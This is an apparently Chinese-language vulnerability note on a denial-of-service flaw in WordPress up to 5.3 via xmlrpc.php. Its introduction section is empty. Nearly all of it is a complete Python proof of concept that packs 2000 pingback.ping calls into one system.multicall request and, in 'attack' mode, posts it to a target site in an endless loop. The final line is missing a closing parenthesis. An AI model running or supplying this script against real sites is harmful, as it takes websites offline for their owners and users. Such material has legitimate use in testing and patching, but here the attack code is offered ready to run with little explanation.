<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>WordPress &lt;=5.3.x xmlrpc.php拒绝服务漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>WordPress &lt;= 5.3</p><h2>三、复现过程</h2><p>漏洞文件</p><p>/wordpress/xmlrpc.php<br />/wp/xmlrpc.php</p><p>from urllib.parse import urlparse<br />import sys, uuid, urllib3, requests<br />urllib3.disable_warnings()<br /><br />DEBUG = True <br />def dprint(X):<br />    if DEBUG: print(X)<br /><br />COUNT=0<br />def build_entry(pingback,target):<br />    global COUNT<br />    COUNT +=1<br />    entry  = "&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;methodName&lt;/name&gt;&lt;value&gt;pingback.ping&lt;/value&gt;&lt;/member&gt;&lt;member&gt;"<br />    entry += f"&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;{pingback}/{COUNT}&lt;/value&gt;"<br />    #entry += f"&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;{pingback}/{uuid.uuid4()}&lt;/value&gt;"<br />    entry += f"&lt;value&gt;{target}/?p=1&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;"<br />    #entry += f"&lt;value&gt;{target}/#e&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;" # taxes DB more<br />    return entry<br /><br />def build_request(pingback,target,entries):<br />    prefix   = "&lt;methodCall&gt;&lt;methodName&gt;system.multicall&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;array&gt;"<br />    suffix   = "&lt;/array&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"<br />    request  = prefix<br />    for _ in range(0,entries): request += build_entry(pingback,target)<br />    request += suffix<br />    return request<br /><br />def usage_die():<br />    print(f"[!] Usage: {sys.argv[0]} &lt;check/attack&gt; &lt;pingback url&gt; &lt;target url&gt;")<br />    exit(1)<br /><br />def get_args():<br />    if len(sys.argv) != 4: usage_die()<br />    action   = sys.argv[1]<br />    pingback = sys.argv[2]<br />    target   = sys.argv[3]<br />    if action not in ("check","attack"): usage_die()<br />    for URL in (pingback,target):<br />        res = urlparse(URL)<br />        if not all((res.scheme,res.netloc)): usage_die()<br />    return (action,pingback,target)<br /><br />def main(action,pingback,target):<br />    print("[&gt;] WordPress &lt;= 5.3.? Denial-of-Service PoC")<br />    print("[&gt;] @roddux 2019 | Arcturus Security | labs.arcturus.net")<br />    # he checc<br />    if action == "check":    entries = 2<br />    # he attacc<br />    elif action == "attack": entries = 2000<br />    # but most importantly<br />    print(f"[+] Running in {action} mode")<br />    # he pingbacc<br />    print(f"[+] Got pingback URL \"{pingback}\"")<br />    print(f"[+] Got target URL \"{target}\"")<br />    print(f"[+] Building {entries} pingback calls")<br />    # entries = 1000 # TESTING<br />    xmldata = build_request(pingback,target,entries)<br />    dprint("[+] Request:\n")<br />    dprint(xmldata+"\n")<br />    print(f"[+] Request size: {len(xmldata)} bytes")<br />    if action == "attack":<br />        print("[+] Starting attack loop, CTRL+C to stop...")<br />        rcount = 0<br />        try:<br />            while True:<br />                    try:<br />                        resp  = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=.2)<br />                        #dprint(resp.content.decode("UTF-8")[0:500]+"\n")<br />                        if resp.status_code != 200:<br />                            print(f"[!] Received odd status ({resp.status_code}) -- DoS successful?")<br />                    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:<br />                        pass<br />                    rcount += 1<br />                    print(f"\r[+] Requests sent: {rcount}",end="")<br />        except KeyboardInterrupt:<br />            print("\n[&gt;] Attack finished",end="\n\n")<br />            exit(0)<br />    elif action == "check":<br />        print("[+] Sending check request")<br />        try:<br />            resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=10)<br />            if resp.status_code != 200:<br />                print(f"[!] Received odd status ({resp.status_code}) -- check target url")<br />            print("[+] Request sent")<br />            print("[+] Response headers:\n")<br />            print(resp.headers)<br />            print("[+] Response dump:")<br />            print(resp.content.decode("UTF-8"))<br />            print(&quot;[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it&quot;)<br />        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:<br />            print("[!] Connection error")<br />            exit(1)<br />        print("[&gt;] Check finished")<br /><br />if __name__ == "__main__":<br />    main(*get_args()</p></body></html>